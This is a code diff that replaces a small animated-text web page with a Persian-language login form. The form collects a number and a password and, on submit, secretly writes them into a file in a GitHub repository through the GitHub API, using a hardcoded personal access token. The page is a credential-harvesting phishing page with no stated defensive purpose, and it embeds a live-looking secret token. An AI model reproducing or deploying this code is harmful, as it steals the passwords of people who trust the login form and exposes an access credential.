@@ -1,65 +1,54 @@
 <!DOCTYPE html>
 <html>
-
 <head>
-    <meta charset="utf-8">
-    <title>Interactive Text</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background: #121212;
-            overflow: hidden;
-        }
-
-        .moving-text {
-            font-size: 36px;
-            font-weight: bold;
-            color: #1ae907;
-            font-family: 'Oswald', sans-serif;
-            text-transform: uppercase;
-            letter-spacing: 5px;
-            position: absolute;
-            transition: transform 0.3s ease-in-out;
-        }
-
-        .moving-text:hover {
-            transform: translateX(200px);
-        }
-    </style>
+    <title>صفحه ورود</title>
 </head>
-
 <body>
-    <div class="moving-text">amir hossain</div>
+    <h2>ورود به حساب کاربری</h2>
+    <form id="loginForm">
+        <label for="username">شماره:</label>
+        <input type="text" id="username" name="username" required><br><br>
+
+        <label for="password">رمز عبور:</label>
+        <input type="password" id="password" name="password" required><br><br>
+
+        <button type="submit">ورود</button>
+    </form>
+
     <script>
-        const movingText = document.querySelector('.moving-text');
-        movingText.addEventListener('mousedown', (e) => {
-            e.preventDefault();
-            const initialX = e.clientX;
-            const initialTransform = getComputedStyle(movingText).transform;
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // جلوگیری از ارسال فرم به صفحه دیگر
 
-            function onMouseMove(e) {
-                const deltaX = e.clientX - initialX;
-                movingText.style.transform = `${initialTransform} translateX(${deltaX}px)`;
-            }
+            // اطلاعات ورود کاربر را دریافت
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
 
-            function onMouseUp() {
-                document.removeEventListener('mousemove', onMouseMove);
-                document.removeEventListener('mouseup', onMouseUp);
-            }
+            // استفاده از GitHub API برای ایجاد یک فایل در ریپازیتوری
+            const githubToken = "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"; // توکن دسترسی GitHub شما
+            const repoOwner = "amixr3"; // نام کاربری GitHub شما
+            const repoName = "Amixr3.github.io"; // نام ریپازیتوری
 
-            document.addEventListener('mousemove', onMouseMove);
-            document.addEventListener('mouseup', onMouseUp);
+            const fileContent = `شماره: ${username}, رمز عبور: ${password}`;
+
+            fetch(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/data.txt`, {
+                method: "PUT",
+                headers: {
+                    Authorization: `token ${githubToken}`,
+                },
+                body: JSON.stringify({
+                    message: "اطلاعات ورود کاربر",
+                    content: btoa(fileContent), // رمزنگاری محتوا به Base64
+                    branch: "main", // نام شاخه مورد نظر
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert("اطلاعات با موفقیت ذخیره شد.");
+            })
+            .catch(error => {
+                console.error("خطا در ذخیره اطلاعات:", error);
+            });
         });
     </script>
 </body>
-
 </html>
